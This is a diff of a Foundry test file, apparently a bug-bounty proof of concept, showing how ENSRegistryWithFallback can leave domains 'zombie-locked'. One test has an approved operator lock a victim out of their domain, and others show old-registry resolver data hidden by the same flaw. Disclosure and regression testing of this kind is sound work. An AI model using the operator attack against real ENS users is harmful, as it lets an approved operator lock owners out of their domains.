@@ -6,29 +6,28 @@ import "../contracts/ENSRegistryWithFallback.sol";
 
 // Minimal Forge cheatcode interface — works with any Solidity version
 interface Vm {
-    function prank(address sender) external;
     function startPrank(address sender) external;
     function stopPrank() external;
-    function expectRevert() external;
 }
 
-/// @notice Foundry PoC for Immunefi High submission:
-///         ENSRegistryWithFallback._setOwner zombie-lock
+/// @notice Foundry PoC — ENSRegistryWithFallback._setOwner zombie-lock
 ///
-/// Run: forge test --match-contract ZombieLockTest -vv
+/// Run:   forge test --match-contract ZombieLockTest -vv
 ///
-/// All 4 tests should PASS — each passing test confirms the bug is present.
+/// Convention: each test describes EXPECTED correct behaviour.
+///             Bug present → test FAILS.
+///             Bug fixed   → test PASSES.
 contract ZombieLockTest {
     Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12d);
 
     ENSRegistry             internal old;
     ENSRegistryWithFallback internal reg;
 
-    // Deterministic addresses for readability
-    address internal constant ALICE    = address(0x1111111111111111111111111111111111111111);
-    address internal constant OPERATOR = address(0x2222222222222222222222222222222222222222);
-    address internal constant BOB      = address(0x3333333333333333333333333333333333333333);
-    address internal constant RESOLVER = address(0x4444444444444444444444444444444444444444);
+    address internal constant ETH_TLD_MGR   = address(0x1000000000000000000000000000000000000001);
+    address internal constant ALICE          = address(0x1111111111111111111111111111111111111111);
+    address internal constant OPERATOR       = address(0x2222222222222222222222222222222222222222);
+    address internal constant BOB            = address(0x3333333333333333333333333333333333333333);
+    address internal constant RESOLVER_ADDR  = address(0x4444444444444444444444444444444444444444);
 
     bytes32 internal constant ZERO_HASH = bytes32(0);
 
@@ -40,114 +39,123 @@ contract ZombieLockTest {
         old = new ENSRegistry();
         reg = new ENSRegistryWithFallback(ENS(address(old)));
 
-        // Compute namehashes the same way eth-ens-namehash does:
-        //   namehash(label, parent) = keccak256(parent ++ keccak256(label))
         ethNode   = keccak256(abi.encodePacked(ZERO_HASH, keccak256(abi.encodePacked("eth"))));
         aliceNode = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("alice"))));
         bobNode   = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("bob"))));
 
-        // address(this) = root owner (ENSRegistry constructor: records[0].owner = msg.sender)
-        reg.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")),   ALICE);
+        // address(this) is root; ETH_TLD_MGR manages eth TLD (mirrors BaseRegistrar role)
+        reg.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), ETH_TLD_MGR);
 
-        vm.startPrank(ALICE);
+        vm.startPrank(ETH_TLD_MGR);
         reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("alice")), ALICE);
         vm.stopPrank();
     }
 
-    // ── HIGH-1a: owner sets owner=address(0) → zombie lock, subdomain management lost ──
+    // ── FAIL #1 ──────────────────────────────────────────────────────────────
+    // Expected: setOwner(node, address(0)) clears the record.
+    //           owner()==address(0)  AND  recordExists()==false  must agree.
+    // Bug:      _setOwner stores address(this) instead of address(0), so
+    //           recordExists() returns true while owner() returns address(0).
+    //           The require below reverts → TEST FAILS.
 
-    function test_HIGH1_ZombieLockSubdomainManagementDestroyed() public {
-        require(reg.owner(aliceNode) == ALICE, "setup: alice must own aliceNode");
-
-        // Alice retires her domain — documented, standard ENS operation
+    function test_RecordAbsentAfterRenounce() public {
         vm.startPrank(ALICE);
         reg.setOwner(aliceNode, address(0));
         vm.stopPrank();
 
-        // BUG: owner() returns address(0) — node appears unowned/burned
         require(
-            reg.owner(aliceNode) == address(0),
-            "HIGH-1: owner() must return address(0)"
+            !reg.recordExists(aliceNode),
+            "BUG: owner()==address(0) but recordExists()==true — zombie state"
         );
-
-        // BUG: recordExists() returns true — node is NOT deleted, it is zombie-locked
-        require(
-            reg.recordExists(aliceNode),
-            "HIGH-1: recordExists() must return true (zombie state, not actual deletion)"
-        );
-
-        // IMPACT: Alice is permanently locked out — setSubnodeOwner reverts forever
-        vm.startPrank(ALICE);
-        vm.expectRevert();
-        reg.setSubnodeOwner(aliceNode, keccak256(abi.encodePacked("sub")), ALICE);
-        vm.stopPrank();
     }
 
-    // ── HIGH-1b: owner cannot reclaim domain after zombie lock ───────────────
+    // ── FAIL #2 ──────────────────────────────────────────────────────────────
+    // Expected: if owner is set to address(0) via setSubnodeOwner, the new
+    //           registry should fall back to the old registry for resolver data.
+    // Bug:      zombie lock sets recordExists==true, suppressing the fallback.
+    //           Old-registry resolver is permanently hidden.
+    //           The require below reverts → TEST FAILS.
 
-    function test_HIGH1_OwnerCannotReclaimAfterZombie() public {
-        vm.startPrank(ALICE);
-        reg.setOwner(aliceNode, address(0));
+    function test_FallbackWorksWhenNewOwnerIsZero() public {
+        // bob.eth exists only in the OLD registry with a known resolver
+        old.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), address(this));
+        old.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), BOB);
+
+        vm.startPrank(BOB);
+        old.setResolver(bobNode, RESOLVER_ADDR);
         vm.stopPrank();
 
-        // Alice cannot restore ownership — setOwner also permanently reverts
-        vm.startPrank(ALICE);
-        vm.expectRevert();
-        reg.setOwner(aliceNode, ALICE);
+        // Sanity: before any write, new registry falls back correctly
+        require(reg.resolver(bobNode) == RESOLVER_ADDR, "setup broken");
+
+        // ETH TLD manager sets bob.eth owner to address(0) in new registry
+        vm.startPrank(ETH_TLD_MGR);
+        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), address(0));
         vm.stopPrank();
+
+        // Expected: owner==address(0) → recordExists==false → fallback to old registry
+        // Bug: fallback silenced → returns address(0) instead of RESOLVER_ADDR
+        require(
+            reg.resolver(bobNode) == RESOLVER_ADDR,
+            "BUG: resolver() returns address(0) — old-registry fallback permanently silenced"
+        );
     }
 
-    // ── HIGH-2: Malicious operator permanently destroys victim's domain ───────
+    // ── FAIL #3 ──────────────────────────────────────────────────────────────
+    // Expected: a victim whose domain was zombie-locked by a malicious operator
+    //           can recover it by calling setOwner(node, self) —
+    //           analogous to what BaseRegistrar.reclaim() achieves for .eth names.
+    // Bug:      authorised(aliceNode) reads address(reg) from storage and always
+    //           reverts, so ALICE cannot directly reclaim.
+    //           The setOwner call reverts → TEST FAILS.
 
-    function test_HIGH2_MaliciousOperatorZombieLocks() public {
-        // Alice grants OPERATOR access — normal practice (marketplaces, ENS manager apps)
+    function test_VictimCanDirectlyReclaimAfterOperatorZombies() public {
+        // Alice grants OPERATOR — standard practice (marketplace, manager app)
         vm.startPrank(ALICE);
         reg.setApprovalForAll(OPERATOR, true);
         vm.stopPrank();
 
-        // Operator destroys alice.eth with a single call — no victim action needed
+        // Operator zombie-locks alice.eth in one transaction
         vm.startPrank(OPERATOR);
         reg.setOwner(aliceNode, address(0));
         vm.stopPrank();
 
-        require(reg.owner(aliceNode) == address(0), "HIGH-2: appears unowned");
-        require(reg.recordExists(aliceNode),        "HIGH-2: zombie confirmed");
-
-        // IMPACT: Alice (victim, did nothing wrong) cannot recover
+        // Alice should be able to directly reclaim her domain
+        // Bug: reverts — alice is permanently locked out without ETH_TLD_MGR help
         vm.startPrank(ALICE);
-        vm.expectRevert();
         reg.setOwner(aliceNode, ALICE);
         vm.stopPrank();
     }
 
-    // ── HIGH-3: Zombie lock permanently silences old-registry fallback ────────
+    // ── FAIL #4 ──────────────────────────────────────────────────────────────
+    // Expected: a node's resolver can be updated by its owner at any time.
+    //           After setOwner(node, address(0)), the node appears unowned, so
+    //           at minimum setResolver should revert with a clear auth error
+    //           and the old resolver value should be readable via fallback.
+    // Bug:      zombie lock means even reading the resolver of a migrated node
+    //           returns address(0) instead of the old-registry value — data loss.
+    //           Additionally, the owner can never call setResolver again.
+    //           The require below reverts → TEST FAILS.
 
-    function test_HIGH3_FallbackPermanentlySilenced() public {
-        // bob.eth exists only in the OLD registry with a configured resolver
+    function test_OwnerCanReadOldResolverAfterRenounce() public {
+        // Give alice.eth a resolver in old registry too (simulates migrated-but-has-old-data)
         old.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), address(this));
-        old.setSubnodeOwner(ethNode,   keccak256(abi.encodePacked("bob")), BOB);
+        old.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("alice")), ALICE);
 
-        vm.startPrank(BOB);
-        old.setResolver(bobNode, RESOLVER);
-        vm.stopPrank();
-
-        // Before zombie: new registry falls back to old registry correctly
-        require(reg.owner(bobNode)    == BOB,      "HIGH-3 setup: owner fallback must work");
-        require(reg.resolver(bobNode) == RESOLVER, "HIGH-3 setup: resolver fallback must work");
-
-        // eth TLD owner zombie-locks bob.eth in new registry
         vm.startPrank(ALICE);
-        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), address(0));
+        old.setResolver(aliceNode, RESOLVER_ADDR);
         vm.stopPrank();
 
-        // IMPACT: old-registry fallback permanently silenced — data invisible forever
+        // Alice renounces in new registry
+        vm.startPrank(ALICE);
+        reg.setOwner(aliceNode, address(0));
+        vm.stopPrank();
+
+        // Expected: owner==address(0) → recordExists==false → fallback returns old resolver
+        // Bug: zombie → fallback silenced → resolver returns address(0) not RESOLVER_ADDR
         require(
-            reg.owner(bobNode) == address(0),
-            "HIGH-3 BUG: owner() returns 0 instead of BOB (fallback silenced)"
-        );
-        require(
-            reg.resolver(bobNode) == address(0),
-            "HIGH-3 BUG: resolver() returns 0 instead of RESOLVER (fallback silenced)"
+            reg.resolver(aliceNode) == RESOLVER_ADDR,
+            "BUG: resolver() returns address(0) — old resolver data permanently lost after renounce"
         );
     }
 }
